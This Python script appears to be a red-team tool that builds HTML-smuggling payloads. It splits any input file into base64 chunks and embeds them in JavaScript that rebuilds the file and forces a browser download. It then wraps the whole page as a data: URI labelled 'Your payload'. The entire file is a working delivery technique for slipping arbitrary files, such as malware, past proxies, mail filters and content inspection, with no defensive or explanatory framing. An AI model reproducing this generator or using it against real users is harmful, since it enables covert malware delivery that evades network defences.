from sys import argv
from base64 import b64encode
from pathlib import Path

'''Colour Codes for the athena modules'''

class prettier_print:
    HEADER = '\033[95m'
    OKPINK = '\u001b[35m'
    OKGREEN = '\u001b[32m'
    WARNING = '\u001b[31m'
    FAIL = '\u001b[41;1m \u001b[30m'
    ENDC = '\u001b[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

logo=f'''
{prettier_print.OKGREEN}░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░▒▓██████▓▒░{prettier_print.WARNING}░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  {prettier_print.ENDC}
{prettier_print.OKGREEN}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒{prettier_print.WARNING}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ {prettier_print.ENDC}
{prettier_print.OKGREEN}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒{prettier_print.WARNING}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ {prettier_print.ENDC}
{prettier_print.OKGREEN}░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ ░▒▓█▓▒░  ░▒▓████████▓▒{prettier_print.WARNING}░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  {prettier_print.ENDC}
{prettier_print.OKGREEN}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒{prettier_print.WARNING}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ {prettier_print.ENDC}
{prettier_print.OKGREEN}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒{prettier_print.WARNING}░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ {prettier_print.ENDC}
{prettier_print.OKGREEN}░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒{prettier_print.WARNING}░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ {prettier_print.ENDC}
                                                                                                                                              
          By @gr4y_{prettier_print.OKPINK}r0se{prettier_print.ENDC}: https://github.com/Gr4y-r0se '''

def process_file(filepath):
    with open(filepath,'rb') as file:
        content = file.read()

    parts = []
    leng = len(content)//5
    for i in range(4):
        parts.append(content[leng*i:leng*(i+1)])
    parts.append(content[leng*4:])
    
    parts_b64 = [b64encode(i) for i in parts]

    return parts_b64

def populate_template(filename,data):
    template = '''<button id="downloadButton">Download</button><script>document.getElementById('downloadButton').addEventListener('click', () => { b1 = "{{part1}}";b2 = "{{part2}}";b3 = "{{part3}}";b4 = "{{part4}}";b5 = "{{part5}}";combinedData = atob(b1) + atob(b2) + atob(b3) + atob(b4) + atob(b5);bytes=new Uint8Array(combinedData.length);for (var i = 0;i<combinedData.length;i++){bytes[i]=combinedData.charCodeAt(i)};blob = new Blob([bytes.buffer], { type: "octet/stream" });link = document.createElement("a");link.download = "{{filename}}"; link.href = URL.createObjectURL(blob);document.body.appendChild(link);link.click();document.body.removeChild(link);});</script>'''
    for i in range(5):
        template = template.replace('{{part%s}}'%(str(i+1)),data[i].decode('utf-8'))
    template = template.replace('{{filename}}',filename)

    data_uri = 'data:text/html;base64,'+(str(b64encode(template.encode('utf-8')))[2:-1])
    return data_uri


if __name__ == '__main__':
    print(logo)
    path = Path(argv[1])
    file = path.name
    print(f'\n\n\tProcessing {prettier_print.OKGREEN}{file}{prettier_print.ENDC}.')
    try:
        payload_data = process_file(argv[1])
        browser_payload = populate_template(file,payload_data)
        if len(browser_payload) < 2084:
            print(f'\n\n\t{prettier_print.OKGREEN}Your payload:{prettier_print.ENDC} \n\n{browser_payload}\n\n')
        else:
            print(f'\n\n\tPayload {prettier_print.WARNING}too large{prettier_print.ENDC} ({len(browser_payload)} chars) to print, saving to {prettier_print.OKGREEN}payload.txt{prettier_print.ENDC}\n\n')
            with open('payload.txt','w') as file:
                file.write(browser_payload)
    except Exception as e:
        print('An error occured :/ are you sure that file exists?')
    
    
